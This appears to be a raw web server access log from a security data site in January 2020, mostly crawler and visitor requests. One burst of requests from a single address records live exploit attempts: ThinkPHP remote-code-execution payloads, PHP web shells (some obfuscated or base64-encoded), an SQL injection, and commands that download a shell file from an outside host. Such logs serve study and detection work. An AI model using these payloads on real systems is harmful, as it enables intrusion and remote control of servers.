159.138.158.14 - - [27/Jan/2020:02:33:59 -0800] "GET /tg_snort_full.7z HTTP/1.1" 404 257 "-" "Mozilla/5.0(Linux;Android 5.1.1;OPPO A33 Build/LMY47V;wv) AppleWebKit/537.36(KHTML,link Gecko) Version/4.0 Chrome/42.0.2311.138 Mobile Safari/537.36 Mb2345Browser/9.0" 
207.46.13.73 - - [27/Jan/2020:03:02:34 -0800] "GET /self.logs/access.log.2018-02-07.gz HTTP/1.1" 301 543 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [27/Jan/2020:03:06:25 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
202.88.234.181 - - [27/Jan/2020:03:09:02 -0800] "GET / HTTP/1.0" 200 12660 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0" 
202.88.234.181 - - [27/Jan/2020:03:09:03 -0800] "GET /css/style.css HTTP/1.0" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0" 
106.120.173.118 - - [27/Jan/2020:03:10:11 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930795 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
182.75.148.202 - - [27/Jan/2020:03:15:38 -0800] "GET / HTTP/1.1" 200 12661 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
182.75.148.202 - - [27/Jan/2020:03:15:39 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
182.75.148.202 - - [27/Jan/2020:03:15:39 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
157.55.39.111 - - [27/Jan/2020:03:25:19 -0800] "GET /self.logs/error.log.2018-06-24.gz HTTP/1.1" 200 4942 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
162.210.196.98 - - [27/Jan/2020:03:32:36 -0800] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [27/Jan/2020:03:32:39 -0800] "GET / HTTP/1.1" 200 12617 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
194.61.92.11 - - [27/Jan/2020:03:37:49 -0800] "GET / HTTP/1.1" 200 12661 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
194.61.92.11 - - [27/Jan/2020:03:37:50 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
194.61.92.11 - - [27/Jan/2020:03:37:51 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
194.61.92.11 - - [27/Jan/2020:03:37:51 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
194.61.92.11 - - [27/Jan/2020:03:37:54 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
198.108.66.224 - - [27/Jan/2020:03:41:38 -0800] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 zgrab/0.x" 
198.108.66.224 - - [27/Jan/2020:03:41:39 -0800] "GET / HTTP/1.1" 200 12617 "http://66.33.221.139:80/" "Mozilla/5.0 zgrab/0.x" 
27.186.192.117 - - [27/Jan/2020:03:46:34 -0800] "GET /favicon.ico HTTP/1.1" 200 302 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
157.55.39.111 - - [27/Jan/2020:03:46:41 -0800] "GET /self.logs/access.log.2019-11-14.gz HTTP/1.1" 200 16266 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.73 - - [27/Jan/2020:03:46:45 -0800] "GET /self.logs/error.log.2017-09-23.gz HTTP/1.1" 200 2102 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.85 - - [27/Jan/2020:03:49:26 -0800] "GET /self.logs/access.log.2017-10-12.gz HTTP/1.1" 200 29788 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
77.75.79.101 - - [27/Jan/2020:03:54:29 -0800] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.79.101 - - [27/Jan/2020:03:54:30 -0800] "GET /Datasets%20Description/Network/smtp.html HTTP/1.1" 304 165 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
27.186.192.117 - - [27/Jan/2020:03:55:14 -0800] "GET /favicon.ico HTTP/1.1" 200 302 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
36.110.147.97 - - [27/Jan/2020:04:03:39 -0800] "GET /robots.txt HTTP/1.1" 200 251 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
159.138.154.167 - - [27/Jan/2020:04:04:55 -0800] "GET /self.logs/. HTTP/1.1" 200 20688 "-" "Mozilla/5.0(Linux;Android 5.1.1;OPPO A33 Build/LMY47V;wv) AppleWebKit/537.36(KHTML,link Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 LieBaoFast/4.51.3" 
27.186.192.117 - - [27/Jan/2020:04:09:11 -0800] "GET /favicon.ico HTTP/1.1" 200 302 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
113.171.224.176 - - [27/Jan/2020:04:12:25 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
27.186.192.117 - - [27/Jan/2020:04:12:41 -0800] "GET /favicon.ico HTTP/1.1" 200 302 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
27.186.192.117 - - [27/Jan/2020:04:17:30 -0800] "GET /favicon.ico HTTP/1.1" 200 302 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
17.58.100.40 - - [27/Jan/2020:04:29:00 -0800] "GET /robots.txt HTTP/1.1" 200 244 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.97.104 - - [27/Jan/2020:04:29:00 -0800] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 711 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
36.110.147.97 - - [27/Jan/2020:04:31:35 -0800] "GET / HTTP/1.1" 200 12661 "http://www.sogou.com/web?query=site%3Awww.secrepo.com" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
119.39.93.143 - - [27/Jan/2020:04:39:50 -0800] "GET / HTTP/1.1" 200 12661 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
119.39.93.143 - - [27/Jan/2020:04:39:50 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
119.39.93.143 - - [27/Jan/2020:04:39:50 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
119.39.93.143 - - [27/Jan/2020:04:39:50 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
119.39.93.143 - - [27/Jan/2020:04:40:17 -0800] "GET /auth.log/auth.log.gz HTTP/1.1" 200 615574 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
119.39.93.143 - - [27/Jan/2020:04:40:21 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" 
207.46.13.73 - - [27/Jan/2020:04:52:35 -0800] "GET /self.logs/error.log.2017-08-07.gz HTTP/1.1" 200 845 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.111 - - [27/Jan/2020:04:52:43 -0800] "GET /self.logs/error.log.2018-04-30.gz HTTP/1.1" 200 3312 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.83.89 - - [27/Jan/2020:04:56:11 -0800] "GET / HTTP/1.1" 200 12661 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.83.90 - - [27/Jan/2020:04:56:12 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
114.239.105.89 - - [27/Jan/2020:05:03:31 -0800] "POST /plus/mytag_js.php?aid=9090 HTTP/1.1" 301 527 "http://secrepo.com/plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:32 -0800] "POST /plus/moon.php HTTP/1.1" 301 500 "http://secrepo.com/plus/moon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:32 -0800] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1" 301 710 "http://secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:32 -0800] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" 301 1210 "http://secrepo.com/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:33 -0800] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" 301 1025 "http://secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:33 -0800] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1" 301 928 "http://secrepo.com/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:33 -0800] "GET /index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,eGJzaGVsbCUzQyUzRnBocCUwQSUyNHN0JTIwJTNEJTIwQGNyZWF0ZV9mdW5jdGlvbiUyOCUyNyUyNyUyQyUyMCUyNF9QT1NUJTVCJTI3aHhxOTkxMjE3JTI3JTVEJTI5JTNCJTBBJTI0c3QlMjglMjklM0I= HTTP/1.1" 301 1020 "http://secrepo.com/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,eGJzaGVsbCUzQyUzRnBocCUwQSUyNHN0JTIwJTNEJTIwQGNyZWF0ZV9mdW5jdGlvbiUyOCUyNyUyNyUyQyUyMCUyNF9QT1NUJTVCJTI3aHhxOTkxMjE3JTI3JTVEJTI5JTNCJTBBJTI0c3QlMjglMjklM0I=" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:34 -0800] "GET /user.php?act=login HTTP/1.1" 301 510 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:34 -0800] "GET /SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest HTTP/1.1" 301 1080 "http://secrepo.com/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:34 -0800] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 301 580 "http://secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:34 -0800] "POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 301 578 "http://secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:35 -0800] "POST /index.php?m=vod-search HTTP/1.1" 301 518 "http://secrepo.com/index.php?m=vod-search" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:35 -0800] "GET /index.php?s=index/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php HTTP/1.1" 301 796 "http://secrepo.com/index.php?s=index/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:36 -0800] "GET /index.php?s=Home/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php HTTP/1.1" 301 794 "http://secrepo.com/index.php?s=Home/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:36 -0800] "GET /index.php?s=index/\\\\think\\\\Container/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php HTTP/1.1" 301 808 "http://secrepo.com/index.php?s=index/\\\\think\\\\Container/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:36 -0800] "POST /index.php HTTP/1.1" 301 492 "http://secrepo.com/index.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:37 -0800] "POST /index.php?s=captcha HTTP/1.1" 301 512 "http://secrepo.com/index.php?s=captcha" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
114.239.105.89 - - [27/Jan/2020:05:03:37 -0800] "GET /?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('nuan.php',file_get_contents('http://www.520yxsf.com/shell.txt'));</php> HTTP/1.1" 301 794 "http://secrepo.com/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('nuan.php',file_get_contents('http://www.520yxsf.com/shell.txt'));</php>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
113.171.224.176 - - [27/Jan/2020:05:14:47 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.148.120 - - [27/Jan/2020:05:26:08 -0800] "GET /robots.txt HTTP/1.1" 200 244 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
193.60.198.37 - - [27/Jan/2020:05:44:07 -0800] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
18.191.69.226 - - [27/Jan/2020:05:48:18 -0800] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
18.191.69.226 - - [27/Jan/2020:05:48:18 -0800] "GET / HTTP/1.1" 200 12660 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
1.22.146.93 - - [27/Jan/2020:05:55:12 -0800] "GET / HTTP/1.1" 200 12660 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" 
1.22.146.93 - - [27/Jan/2020:05:55:12 -0800] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" 
1.22.146.93 - - [27/Jan/2020:05:55:12 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" 
1.22.146.93 - - [27/Jan/2020:05:55:12 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" 
1.22.146.93 - - [27/Jan/2020:05:55:13 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" 
176.9.4.107 - - [27/Jan/2020:06:03:06 -0800] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
176.9.4.107 - - [27/Jan/2020:06:03:06 -0800] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
176.9.4.107 - - [27/Jan/2020:06:03:06 -0800] "GET /Datasets%20Description/?C=D;O=D HTTP/1.1" 200 594 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
176.9.4.107 - - [27/Jan/2020:06:03:12 -0800] "GET /Datasets%20Description/?C=M;O=D HTTP/1.1" 200 594 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
